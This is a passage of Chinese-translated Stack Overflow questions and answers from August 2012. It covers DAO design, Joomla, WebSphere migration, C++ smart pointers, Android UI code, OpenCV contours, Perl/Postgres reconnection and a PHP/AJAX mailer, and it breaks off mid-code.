问题是：如果对持久数据的操作有任何限制，DAO 应该处理多少业务逻辑？

**示例：**
`BusinessObject1`在其生命周期内只能更新一次。假设我们可以很容易地知道它是否已经更新，如果我们`BusinessObject1`再次尝试更新，DAO 是否应该抛出异常？或者它应该什么都没有检测到，这应该在业务层中进行管理？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-31T11:47:32.290

如果您将数据存储在具有参照完整性规则的数据库中，那么您的数据层中就有业务规则。

这是所有经验法则的问题。他们工作，直到他们没有。重点不是要避免数据层中的规则，重点是只将规则放在属于那里的数据层中。例如，强制*存储数据有效性的*规则属于数据层。强制数据使用方式的规则*不*属于数据层。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:39:49.350

你担心的是

> 如果由于特定领域的某些要求而无法删除或更新业务对象怎么办？

我认为将业务逻辑与 DAO 分开仍然是一个好主意，因为它的业务大部分时间都在不断变化。因此，如果您的要求是在执行 update n delete 时设置业务约束，那么服务层应该检查这个约束。这样您就不必在 DAO 层中进行任何更改。

此外，如果将来您想切换到另一个数据库，那么您也不必担心业务逻辑，因为您只需要关注数据库特定的操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:41:03.127

您可以在您的 DAO 中定义限制`BusinessObject1`（例如：只能更新 1 次），您的 DAO 将读取这些限制。然后当你给 DAO 一个修改过的对象并告诉他持久化这个修改（更新）时，DAO 会抛出一个异常。

我认为这就是 Doctrine（数据映射器 ORM）的工作原理。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T14:26:17.007

如果您的应用程序被划分为彼此独立的组件，那么您最终会得到一个业务组件、一个数据库组件（可能实现为 DAO）和一个 UI 组件。业务逻辑组件负责执行应用程序背后的核心业务规则；数据库组件，用于访问数据和执行数据操作规则；最后是 UI 组件，用于控制与用户的交互。

有了这样的设计，就没有关于数据库组件是否应该包含逻辑的争论：当然应该。**它需要规则来管理数据的存储、检索和解释方式。**但是，它包含的逻辑类型不同于业务逻辑或 UI 逻辑。而且，正如已经指出的，数据库组件不必是软件组件；它可能由数据库中的存储过程、函数和触发器组成。

底线是，随意将逻辑放入您的 DAO 中，但确保此类逻辑仅适用于与数据访问相关的操作。同样，在您的 UI 组件中包含逻辑来驱动与用户的交互也很好。

# joomla - 在谷歌搜索列表中输入网站网址时显示磨损的标题

> ID：12213531
> 
> 赞同：0
> 
> 时间：2012-08-31T10:29:42.483
> 
> 标签：joomla

当我在谷歌搜索框中输入我的网站 URL（www.xyz.org）时，网站标题显示错误，请看下图。这个网站是在 joomla 中开发的。

![您可以在图像上看到第一个列表，它显示了错误的标题](../Images/4dfcd2289f5c6ac79f23b02b60dd5775.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:54:44.767

*   请转到 Joomla 管理员
*   请到此路径站点-> 全局配置-> 元数据设置
*   从编辑框中添加您对站点的描述`"Global Site Meta Description "`。

但是在谷歌上显示需要一些时间......

试试看....

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-31T10:51:08.970

您的标题标签是正确的，因此请尝试通过 Google 网站管理员工具查看该网站，看看您是否有任何恶意软件处于活动状态。

# java - websphere Application Server 6.1 中的备用 iplanet Web 服务器 jar（KFCJDK11.jar 和 KOCLJDK11.jar）

> ID：12213532
> 
> 赞同：-1
> 
> 时间：2012-08-31T10:29:42.887
> 
> 标签：java, jakarta-ee, webserver, websphere-6.1, servlet-3.0

请任何人建议一些 jar 文件，这是 iplanet Web 服务器 jar（KFCJDK11.jar 和 KOCLJDK11.jar）在 websphere Application Server 6.1 jar 中的功能。

```
we are  using  from iplanet jar
    1\. AppLogic
    2\. TempletDataBasic
    3\. TempletMapBasic
    4\. ITemplateData
    5\. IDataConn
    6\. IQuery
    7\. IResultSet
    8\. IValList
    9\. IAppLogic
    10\. ISession2 
```

我正在做迁移工作，从“Oracle Iplanet Web Server”到“IBM Websphere Application Server”。

我在迁移代码时遇到困难，请帮助我解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:21:03.033

这些类看起来像非标准类，因此在 WebSphere 中可能根本没有等价物。当您将 Java EE 应用程序编码到特定服务器的 API 时，这是一种风险。

您必须准确了解每个类的作用，并找到一种 Java EE 通用或 WebSphere 特定的方法来复制这些功能。我不希望 StackOverflow 上的任何人能够为您提供该列表。

# c++ - 为什么我们首先使用原始指针？不早点使用 RAII

> ID：12213534
> 
> 赞同：0
> 
> 时间：2012-08-31T10:29:46.020
> 
> 标签：c++, smart-pointers

我说的是一般应用程序，而不是低级应用程序，它们与硬件接口。

查看遗留代码有很多：

```
delete myObject; 
```

为什么智能指针的概念没有在更早的时候引入，它只是利用了 RAII，一个基于堆栈的对象在离开范围时销毁的概念。从第一天起就一直存在。

可能是性能，一个额外的方向（但这是很小的代价/开销）。

开发人员可以在 30 分钟内创建一个基本但功能强大的自定义智能指针。那为什么这么久？

或者它在那里，但人们选择不使用它......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T10:35:14.327

我不知道答案，但随着 C++ 从 C 演变而来，C 中的很多代码都使用 malloc/free，因为没有其他方法可以做到这一点，因此它作为新/删除转移到 C++。我确信 C++ 中的智能指针实现是在创建语言之后发生的，毕竟它需要 C++ 早期版本中不存在的模板。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:36:12.367

在设计良好的项目中，对象生命周期设计良好，自动化此类任务几乎没有什么好处。

随着来自自动化环境的程序员开始成为 C++ 中的大多数，它成为一种必需品。

然而，由于不正确使用智能指针而引入的错误仍然比简单地缺少删除更难跟踪。

# php - 在 PHP 中复制 Excel 的循环引用公式

> ID：12213537
> 
> 赞同：3
> 
> 时间：2012-08-31T10:30:01.140
> 
> 标签：php, excel, excel-formula, circular-reference

我正在尝试在 PHP 中复制 Excel 的循环引用公式。

在 Excel 中，我有：

```
A19 = A25-A22 (result: 8771.65)
A22 = A19*14.1% (result: 1236.80)
A25 = 10000 
```

但是，当我尝试在 PHP 中计算它时，它并没有给我正确的结果：

```
$Tax = 0;
$Gross = 0;    
$Net_Amount = 10000;
$Gross = $Net_Amount - $Tax;
$Tax = $Gross * (14.1/100); 
```

关于如何在 PHP 中执行此操作的任何想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:42:14.000

默认情况下，当您有循环引用时，Excel 会报告警告。例外情况是，如果您告诉它处理循环引用，最多可达到预定义（您定义多少）迭代次数。在 PHP 中实现后者的方法是使用循环进行预定义的迭代次数。

```
$cycleCount = 12;

$Tax = 0; 
$Gross = 0;     
$Net_Amount = 10000; 
for ($cycle = 0; $cycle < $cycleCount; $cycle++) {
    $Gross = $Net_Amount - $Tax; 
    $Tax = $Gross * (14.1/100); 
} 
```

# java - 动态内容 Java Android ViewFllipper

> ID：12213543
> 
> 赞同：1
> 
> 时间：2012-08-31T10:30:11.250
> 
> 标签：java, android, dynamic, viewflipper

这是我的布局

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/linearLayout1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"> 
 <ViewFlipper
        android:id="@+id/viewFlipper1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/linearLayout2"
         android:layout_marginTop="0dp"
         android:background="@android:color/white" >
       **<include android:id="@id/*1*" layout="@layout/*layout1*"/>"
       <include android:id="@id/2" layout="@layout/layout2"/>   
        <include android:id="@id/3" layout="@layout/layout3"/>**

    </ViewFlipper>
</Relativelayout> 
```

这是在 onCreate 里面

```
LinearLayout **layout1** = (LinearLayout) findViewById(R.id.**layout1**);
TextView tv = new TextView(this); 
tv.setText("Dynamic Text!");
**layout1**.addView(tv); 
```

一切正常，我只是无法在我的 layout.xml 中加载任何动态内容

我尝试使用 1 和 layout1 但我得到的错误是找不到我的布局

任何想法 ？

谢谢

# android - 检查动态添加的复选框的状态

> ID：12213545
> 
> 赞同：0
> 
> 时间：2012-08-31T10:30:12.453
> 
> 标签：android, checkbox, onclick

我像这样动态添加我的复选框：

```
 public void addFiles()
        {

             LinearLayout layout = (LinearLayout) findViewById(R.id.filesList);

            if(!FileManagerActivity.finalAttachFiles.isEmpty())
            {   

                for (final File file:FileManagerActivity.finalAttachFiles)
                {   

                    Log.i("what I've got", file.toString());
                    View line = new View(this);
                    line.setLayoutParams(new LayoutParams(1, LayoutParams.MATCH_PARENT));
                    line.setBackgroundColor(0xAA345556);
                    informationView= new CheckBox(this);
                    informationView.setTextColor(Color.BLACK);
                    informationView.setTextSize(16);
                    informationView.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
                    informationView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.file_icon, 0, 0, 0);
                    informationView.setText(file.getName().toString());
                    layout.addView(informationView, 0);
                    layout.addView(line, 1);
                    layout.postInvalidate();

                }
            }

        } 
```

我有一个按钮，它的 onClick 事件应该获得这些复选框的可检查状态并删除已检查的...我该如何实现呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:51:58.560

您可以添加您的复选框，例如：

```
for(int i=0;i<totalCB;i++){
    CheckBox chB=new CheckBox(context);
    ...
    chB.setId(i);
    layout.add(...);// add checkbox to view
} 
```

现在，点击按钮，

```
for(int i=0;i<totalCB;i++){
    CheckBox cb=(CheckBox)findViewById(i);
    boolean checked=cd.isChecked();// status of checkbox

    if(checked){
       // perform action 
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:40:30.213

```
 for(int i=0;i<layout.getChildCount;i++){
   if ( ((CheckBox) layout.getChildAt(i)).isChecked() )
                 //remove the Box
} 
```

这应该可以解决问题。如果您的布局中有其他视图或创建一个仅承载复选框的新布局，您可能必须更改代码。代码当然会进入你的按钮 onclicklistener 的 OnClick 方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:41:52.003

您可以使用 为复选框设置 id `informationView.setId(someUniqueInt)`。然后在活动中的任何位置找到一个文本框

`CheckBox checkBox = (CheckBox) findViewById(someUniqueInt)`

然后使用

```
if (checkBox.isChecked()) {
     //do whatever you want here
} 
```

# android - Android - ActionBarSherlock 上的 Navigation_Mode_List

> ID：12213560
> 
> 赞同：0
> 
> 时间：2012-08-31T10:31:05.040
> 
> 标签：android, actionbarsherlock

我使用此模式 ActionBar.Navigation_Mode_list 进行了列表导航，但我不希望出现在菜单上的第一个选项（或选择的选项），我只想显示箭头。有可能吗？

```
ArrayAdapter<CharSequence> list = ArrayAdapter.createFromResource(this, R.array.locations, R.layout.sherlock_spinner_item);
    list.setDropDownViewResource(R.layout.sherlock_spinner_dropdown_item);

    getSupportActionBar().setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);
    getSupportActionBar().setListNavigationCallbacks(list, this); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:56:13.150

不，对不起 - 与常规一样`Spinner`，*总是*有一个选择。欢迎您将数组中的第一个元素设置为呈现为空的元素（例如，空字符串），但随后用户将始终在下拉列表中看到该元素，并且始终可以切换回“空”条目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-02T19:33:56.973

`getView`实际上，可以通过以下方式创建自定义适配器和覆盖方法来做到这一点：

```
@Override    
public View getView(int position, View convertView, ViewGroup parent) {
    TextView title = new TextView(getApplicationContext());
    title.setText("");
    return title;
} 
```

这将只显示箭头。

# java - 记录已执行的 java 代码的行号

> ID：12213570
> 
> 赞同：1
> 
> 时间：2012-08-31T10:31:39.253
> 
> 标签：java, code-coverage

我正在开发一个应用程序。作为其中的一部分，当 Java 程序执行时，我们希望显示代码已执行的 Java 程序源代码的行号。我正在使用 Code 类来获取代码中方法的行号。但是我想获取已经执行的源码的行号，也就是代码路径。

我将在此基础上添加我编写的用于显示方法行号的程序。

```
class LineNum
{
  LineNumber[] ln = new LineNumber[300];
  JavaClass clazz ;
  Code classinfo ;

  public static void printCode(Method[] methods) {
    System.out.println("Entering PrintCode");
    for(int i=0; i < methods.length; i++) {
      System.out.println(methods[i]);

      Code code = methods[i].getCode();
      if(code != null) // Non-abstract method
      {  
        System.out.println(code.getLineNumberTable());
      }
    }
  }
  public static void main(String[] args) {
    LineNum liner = new LineNum();
    liner.clazz = Repository.lookupClass("package_name.File_name");
    printCode(liner.clazz.getMethods());
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:41:43.317

你可以打电话

```
StackTraceElement[] ele = Thread.currentThread().getStackTrace() 
```

任何时候给你以前的电话。StackTraceElement 类有一个方法 getLineNumer() 来获取行号。

[http://docs.oracle.com/javase/7/docs/api/java/lang/StackTraceElement.html](http://docs.oracle.com/javase/7/docs/api/java/lang/StackTraceElement.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:51:51.453

如果您使用 Log4J 作为您的日志库，您可以将其配置为输出行号作为模式的一部分。请参阅“PatternLayout”和“L”转换模式字符。

您可以使用如下转换模式：`"%-5p [%t](%L): %m%n"`来产生：

```
 DEBUG [main](103): Message 1
   WARN  [main](104): Message 2 
```

PatternLayout API： http: [//logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/PatternLayout.html](http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/PatternLayout.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T11:15:04.130

我认为使用 lo4j 是最好的解决方案（@bazwilliams 是如何描述的）。代码依赖于简单的库，并且日志行号可以在代码之外进行可选配置。

@bazwilliams - 您只能为选定的日志记录类别配置布局模式（从而配置选定的附加程序）。

PS。我回答是因为我不知道如何评论@bazwilliams 的答案（或者我不能）。

# opencv - 使用 Opencv 去除小斑点

> ID：12213572
> 
> 赞同：1
> 
> 时间：2012-08-31T10:31:46.583
> 
> 标签：opencv, abort, blobs

我在 Visual Studio 2010 上使用 opencv2.2。我编写了一个代码来预处理 OCR 的图像。我正在使用很多轨迹栏来改变参数。预处理功能之一是通过绘制轮廓并根据大小将它们过滤掉来去除小斑点。但是，当我运行程序时，cvDrawContours 函数给了我一个错误。基本上我会弹出一个错误，说 R6010 -abort 已被调用。命令行说在第 641 行的 matrix.cpp 中有一个未知的数组类型。我在这里包含我的代码。该问题由 BlobFunc 函数中的 cvDrawContours 函数调用。

```
#include <C:\OpenCV2.2\modules\core\include\opencv2\core\core.hpp>  
#include <C:\OpenCV2.2\modules\highgui\include\opencv2\highgui\highgui.hpp>  
#include <iostream>  
#include <string.h>
#include <C:\OpenCV2.2\include\opencv\cv.h>  
#include <stdlib.h>
#include <C:\OpenCV2.2\modules\highgui\include\opencv2\highgui\highgui_c.h>
#include <C:\Users\Administrator\Documents\blobs\blob.h>
#include <C:\Users\Administrator\Documents\blobs\BlobResult.h>

using namespace cv;
using namespace std;

int MAX_KERNEL_LENGTH = 30;
int counter=0;
int Blurtype=0;
int Kern=5;
int *Kernp=&Kern;
int betaval=50;
int *betavalp=&betaval;
int Threshtype=0;
int Threshval=30;
int size=10;

Mat src1, src2, dst1, dst2, dst3;
CvScalar black=CV_RGB( 0, 0, 0 ); // black color
CvScalar white=CV_RGB( 255, 255, 255 );   // white color
double area;

void BlobFunc(int,void*);
int main( int argc, char** argv )
{
    //Read Input
    src1 = imread(argv[1]);
    if( !src1.data ) { printf("Error loading src1 \n"); return -1; }
    //Create Windows
    namedWindow("Original Image",1);
    namedWindow("Binarized Image",1);
    namedWindow("Gray Image",1);
    namedWindow("Sharpened Image",1);
    namedWindow("Blurred Image",1);
    imshow("Original Image",src1);
    namedWindow("Blobs",1);
    //Create Trackbars
    cvtColor(src1,src2,CV_RGB2GRAY);
    imshow("Gray Image",src2);
    threshold( src2, dst1, Threshval, 255,Threshtype);
    imshow("Binarized Image",dst1);
    createTrackbar("Kernel","Blurred Image",&Kern,MAX_KERNEL_LENGTH,BlobFunc); 
    createTrackbar("BlurType","Blurred Image",&Blurtype,3,BlobFunc); 
    createTrackbar("Betaval","Sharpened Image",&betaval,100,BlobFunc);
    createTrackbar("Threshold value","Binarized Image",&Threshval,255,BlobFunc);
    createTrackbar("Type","Binarized Image",&Threshtype,4,BlobFunc);
    createTrackbar("Size","Blobs",&size,100,BlobFunc); //Size of Blob
    waitKey(0);
    return 0;
}

void BlobFunc(int,void*)
{
    CvMemStorage *storage=cvCreateMemStorage(0);
    CvSeq *contours=0;
    cvtColor(src1,src2,CV_RGB2GRAY);
    imshow("Gray Image",src2);
    threshold( src2, dst1, Threshval, 255,Threshtype);
    imshow("Binarized Image",dst1);
    for ( int i = 1; i < Kern; i = i + 2 )
    {
        if (Blurtype==0)
        {
            blur(dst1,dst2, Size( i, i ), Point(-1,-1) );
        }
    else if (Blurtype==1)
        {
            GaussianBlur( dst1, dst2, Size( i, i ), 0, 0 );
        }
    else if (Blurtype==2)
        {
            medianBlur ( dst1, dst2, i );
        }
    else if (Blurtype==3)
        {
            bilateralFilter ( dst1, dst2, i, i*2, i/2 );
        }       
    }
    imshow("Blurred Image",dst2);
    addWeighted( dst1, 1, dst2, -double(betaval)/100, 0.0, dst3);
    imshow("Sharpened Image",dst3);
    IplImage img=dst3;
    cvFindContours(&img,storage,&contours,sizeof(CvContour),CV_RETR_LIST,CV_CHAIN_APPROX_SIMPLE);                                                      
    IplImage *img_out=cvCreateImage( cvGetSize(&img), 8, 3 );
    cvZero( &img_out );
    for( ; contours != 0; contours = contours->h_next )
    {
     cvDrawContours( &img_out, contours, black, black, -1, CV_FILLED, 8 );
    }

    Mat imgout=img_out;
    cvReleaseMemStorage( &storage );
    imshow("Blobs",imgout);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:39:34.240

当我传入无效的 Mat（或 iplimage）时，我得到了这种类型的错误。我可能复制不正确，或者图像可能属于一种类型、通道、颜色数量等。

问题似乎在于一个不正确的参数，所以我会看看你如何传递图像，即而不是 &img，你可以尝试不带 & 的 img。恐怕我不熟悉 C++，但这就是我要开始的地方。

下面的例子是类似的，也许它会帮助展示 & 和 * 的使用。

```
void displayContours(const Mat &src, Mat features) {
    RNG rng(12345);
    Mat canny_output;
    vector<vector<Point> > contours;
    vector<Vec4i> hierarchy;
    Mat s;
    src.copyTo(s);
    findContours(s, contours, hierarchy, CV_RETR_TREE, CV_CHAIN_APPROX_SIMPLE, Point(0, 0));

    /// Approximate contours to polygons + get bounding rects and circles
    vector<vector<Point> > contours_poly(contours.size());
    vector<Rect> boundRect(contours.size());
    vector<Point2f> center(contours.size());
    vector<float> radius(contours.size());

    for (int i = 0; i < contours.size(); i++) {
        approxPolyDP(Mat(contours[i]), contours_poly[i], 3, true);
        boundRect[i] = boundingRect(Mat(contours_poly[i]));
        minEnclosingCircle(contours_poly[i], center[i], radius[i]);
    }

    /// Draw polygonal contour + bonding rects + circles
    for (int i = 0; i < contours.size(); i++) {
        Scalar color = Scalar(rng.uniform(0, 255), rng.uniform(0, 255),
                rng.uniform(0, 255));
        drawContours(features, contours_poly, i, color, 1, 8, vector<Vec4i>(),
                0, Point());
        rectangle(features, boundRect[i].tl(), boundRect[i].br(), color, 2, 8,
                0);
        circle(features, center[i], (int) radius[i], color, 2, 8, 0);
    }

} 
```

这是来自 opencv 教程之一，使用 Mat 而不是 iplImage，这可能需要不同的用法。

# perl - 如何确保准备和执行之间的数据库（Postgres）连接仍然存在？

> ID：12213576
> 
> 赞同：3
> 
> 时间：2012-08-31T10:32:15.493
> 
> 标签：perl, postgresql, connection, reconnect, dbd-pg

我有在 while 循环中永远运行的守护程序脚本。我有一个准备好的语句，这个语句在每个循环上执行。

例子：

```
 my $dbh;
  sub get_dbh {
      return DBI->connect(...);
  }

  my $dbh = get_dbh();
  my $sth = $dbh->prepare("SELECT ....") or die $DBI::errstr;

  while (1) {
      // is connection still there??
      //if (!$dbh->ping) {
      //    $dbh = get_dbh();
      //}

      $sth->execute('param1');

      // do some other things ... sleep between 0 and 3600
  } 
```

如果准备好的语句是在几个小时前准备好的，就会出现（或可能出现）问题。连接可能会死，我也会执行。在每次执行之前检查 $dbh->ping 看起来有点过头了。

MySQL 支持真正有效的 mysql_auto_reconnect。DBD::Pg 没有这样的东西。我阅读了有关 DBI::Apache 的信息，但我认为它依赖于 mod_perl 等。它显然适用于 Web 应用程序。

是否有“最佳实践”方法来检查连接状态并在需要时重新连接？#

我可以在每个循环上准备语句，但这不是解决方案，而只是解决问题的一种方法。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T11:24:11.093

> 是否有“最佳实践”方法来检查连接状态并在需要时重新连接？#

是的，至少在我看来，因为只有一种方法没有竞争条件，那就是在重试循环中执行查询，如果出现错误，该循环会处理错误。

否则你仍然有：

1.  `PREPARE`
2.  `SELECT 1;`或者你的测试语句是什么
3.  网络掉线，后端崩溃，管理员重新启动服务器，无论如何
4.  `EXECUTE`
5.  啪。

正确的行为需要类似伪代码的东西：

```
while not succeeded:
    try:
        execute_statement()
        succeeded = True
    except some_database_exception:
        if transaction_is_valid():
            // a `SELECT 1` or `select 1 from pg_prepared_statements where name = 'blah'
            // succeeded in transaction_is_valid(), so the issue was probably
            // transient. Retry, possibly with a retry counter that resets the 
            // connection if more than a certain number of retries.
            // It can also be useful to examine the exception or error state to 
            // see if the error is recoverable so you don't do things like retry
            // repeatedly for a transaction that's in the error state.
        else if test_connection_usable_after_rollback():
            // Connection is OK but transaction is invalid. You might determine
            // this from the exception state or by seeing if sending a `ROLLBACK`
            // succeeds. In this case you don't have to re-prepare, just open
            // a new transaction. This case is not needed if you're using autocommit.
        else:
            // If you tried a SELECT 1; and a ROLLBACK and neither succeeded, or
            // the exception state suggests the connection is dead. Re-establish
            // it, re-prepare, and restart the last transaction from the beginning.
            reset_connection_and_re_prepare() 
```

冗长又烦人？是的，但通常很容易包装在帮助程序或库中。其他一切仍然受制于种族。

最重要的是，如果您的应用程序在发出不止一件事的事务时，它需要记住在事务提交之前所做的所有事情，并且在出现错误时能够重试整个事务。那，或者告诉用户“哎呀，我吃掉了你的数据，请重新输入并重试”。

如果您不介意比赛并且只想通过定期检查来处理任何明显的死连接，只需将最后一次查询的时间存储在变量中即可。发出查询时，检查时间戳是否超过几分钟，如果是，则发出一个`SELECT 1;`或一个查询`pg_prepared_statements`来检查您准备好的语句。您要么需要准备好向用户吐出错误，要么将整个事情包装在适当的错误处理中......在这种情况下，根本没有必要进行时间检查和测试。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T14:24:35.550

当您知道您可能会让连接空闲一个*小时*时，ping/测试连接是非常合理的。

更好的是，DBI[`connect_cached`](http://search.cpan.org/dist/DBI/DBI.pm#connect_cached)并使[`prepare_cached`](http://search.cpan.org/dist/DBI/DBI.pm#prepare_cached)这相对容易：

```
while (1) {
    my $dbh = DBI->connect_cached(..., { RaiseError => 1 });  # This will ping() for you
    my $sth = $dbh->prepare_cached('SELECT ...');

    $sth->execute('param1');

    # Do work, sleep up to 1 hour
} 
```

这样，您将在连接的整个生命周期内重复使用相同的准备好的语句。

（值得一提的是，现代 DBD::Pg pinging 是通过高效的本机 PostgreSQL 调用实现的。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:48:05.087

我不明白你为什么说 a `ping`before every`execute`太过分了，但另一种方法是`execute`通过重新连接、准备语句和`execute`第二次发出来明确处理失败的情况，因为数据库句柄无效。这会稍微快一点，但我认为没有理由避免该`ping`策略

# javascript - Javascript，检查数组和周围的节点

> ID：12213577
> 
> 赞同：0
> 
> 时间：2012-08-31T10:32:18.763
> 
> 标签：javascript, arrays

Ello Chaps 和 Chapesses！

我有一个这样的Javascript数组：

```
var tinkerArray = [
  [0,0,0],
  [0,1,0],
  [0,0,0]
]; 
```

我的问题是，如何检查每个节点*周围*的数组节点......

例如从`[0,0]`、检查`[0,1]`等`[1,0]`开始

谢谢！

**编辑：**如果可能的话，我想要一个可扩展的解决方案，如果数组是 7x7 - 该算法仍然可以工作......：/

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:35:39.947

更新：

```
function getSurrounding(arr, i, j) {
  var m, n, result = [];
  for (m = i - 1; m <= i + 1; m++) {
    if (m in arr) {
      for (n = j - 1; n <= j + 1; n++) {
         if (n in arr[m] && !(m == i && n == j)) {
            result.push(arr[m][n]);
         }
      }
    }
  }
  return result;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:44:25.933

如果您只想访问给定的相邻元素`i,j`，请访问`i-1, j`, `i,j-1`, `i,j+1`,`i+1, j`并确保索引有效。

它不是很漂亮，但它有效（它假设`i`并且`j`始终是有效的指标）：

```
function neighbours(arr, i, j) {
    var n = [];
    if((i-1) in arr) {
        n.push(arr[i-1][j]);
    }
    if((j-1) in arr) {
        n.push(arr[i][j-1]);
    }
    if((j+1) in arr) {
        n.push(arr[i][j+1]);
    }
    if((i+1) in arr) {
        n.push(arr[i+1][j]);
    }
    return n;
} 
```

这将返回一个包含邻居的新数组。当然，您可以做任何您想做的事情，而不是退回它们；）

# apache - Apache Http Server 2.2.x 需要使用哪个版本的 Subversion？

> ID：12213581
> 
> 赞同：0
> 
> 时间：2012-08-31T10:32:42.793
> 
> 标签：apache, svn, tortoisesvn, version

我需要安装正确版本的“Apache subversion”以使其运行并根据以下页面使用 Apache webserver 2.2.x [http://augusttown.blogspot.com](http://augusttown.blogspot.com/2010/02/setup-http-based-svn-repository-with.html)但是[subversion.tigris.org](http://subversion.tigris.org/servlets/ProjectDocumentList?folderID=8100;)到页面之一似乎不可用，我真的需要知道我必须使用哪个颠覆。

谢谢你的时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:40:57.670

当前的 1.6.x 或 1.7.x 变体都可以在 Apache 2.2.x 上正常工作

# android - 将参数发送到异步任务的更好方法是什么

> ID：12213583
> 
> 赞同：0
> 
> 时间：2012-08-31T10:32:47.110
> 
> 标签：android, android-asynctask

我对android异步任务有疑问。最好在异步的构造函数中发送异步所需的参数还是应该将其添加到execute（）方法中？？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:36:22.973

不是强制性的，但由于 AsyncTask 被设计为在 execute 方法中传递参数，你应该将参数传递给 execute 方法，它会以相同的参数调用 onPreExecute 方法，你可以在那里执行你的初始化任务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:38:49.927

最好的方法是将它们传递给执行。这样更直接。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:41:50.193

在我们使用java的时候，一般都是传入参数，`constructor`并在构造函数中初始化。

但这不是强制性的，您也可以传递它`execute()`。

但是我认为最好传入，`constructor`因为每当创建异步任务类时，都会首先调用构造函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:50:00.353

[`execute()`](http://developer.android.com/reference/android/os/AsyncTask.html#execute%28Params...%29)是你传递参数的地方。

您可以使用构造函数来传递*更一般的而不是特定于某个任务的*东西。例如，传递您的上下文以保存对您的 UI 的引用（例如，progressBar）。

# php - AJAX/PHP 电子邮件程序不发送电子邮件

> ID：12213588
> 
> 赞同：0
> 
> 时间：2012-08-31T10:32:56.440
> 
> 标签：php, ajax, mailer

这是我的 PHP 邮件程序代码：

```
if ($_POST) {
    $email=$_POST['email'];
    $subject=$_POST['subject'];
    $budget=$_POST['budget'];
    $text=$_POST['text'];
    $to="hello@mymail.com";

    mail($to, "Piece of Cake = ".$subject, $text, "Budget:".$budget, "From:".$email );
} 
```

这是我的 AJAX 电子邮件功能：

```
$(function (){
    $('button#send_brief').click(function(){
        var email = $('#brief_email');
        var subject = $('#brief_type');
        var budget = $('#brief_budget');
        var text = $('#brief_comments');
        var emailerData = 'email' + email +'&subject' + subject + '&budget' + budget+ '&text' + text;

        if(text=='') {
            $('#brief_email').css({'background-color':'red'});
         }
         else {

        $.ajax({
            type: "POST",
            url:"emailer.php",
            data: emailerData,
            success: function(){
                $('.success').fadeIn(1000);
                setTimeout (function(){
                $('.brief').slideUp({
                    duration: 1000,
                    easing: 'easeInSine'});}
                            ,2000);
                setTimeout (function(){
                $('#brief').fadeIn();}
                            ,3000);
                setTimeout (function(){
                $('.success').fadeOut(1000);}
                            ,2000);
            }

        });

        return false;}
    });   

}); 
```

这是我的表格：

```
<form method="POST" action="" >
<fieldset>

            <label for="brief_email">Your email</label>
            <input type="text" id="brief_email" placeholder="your contact email here"/>
             etc ...
</fieldset>
</form>
<button id="send_brief">Send it</button> 
```

首先，当我将所有字段留空时，它仍然会显示成功屏幕。其次，即使我输入有效数据，我也不会收到它发送的电子邮件。

我已经多次查看代码，对我来说似乎还可以。

请帮我找出我错的地方。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:44:10.357

您的问题出在 AJAX 构造中，您缺乏以下方面的价值：`val()`

```
var email = $('#brief_email').val();
var subject = $('#brief_type').val();
var budget = $('#brief_budget').val();
var text = $('#brief_comments').val(); 
```

如果没有`val()`您，您将向 PHP 脚本发送一个对象，而不是一个值。

和 vars 构造你缺乏`=`

```
var emailerData = 'email=' + email +'&subject=' + subject + '&budget=' + budget+ '&text=' + text; 
```

此外，您的构造很糟糕，除了检查[mail()](http://uk.php.net/manual/en/function.mail.php)`mail()`之外，您不能发送任何其他值。而你检查，总是正确的，你需要检查至少一个帖子值。`$_POST``$_POST`

```
<?php

if (isset($_POST['email'])) {
    $email=$_POST['email'];
    $subject=$_POST['subject'];
    $budget=$_POST['budget'];
    $text=$_POST['text'];
    $to      = 'mail@example.com';

    $subject = "Piece of Cake = ".$_POST['subject'];
    $message = "New message from website

    Email: $email
    Budget: $budget
    Comments: $text";

    $headers = 'From: ' . $email . "\r\n" .
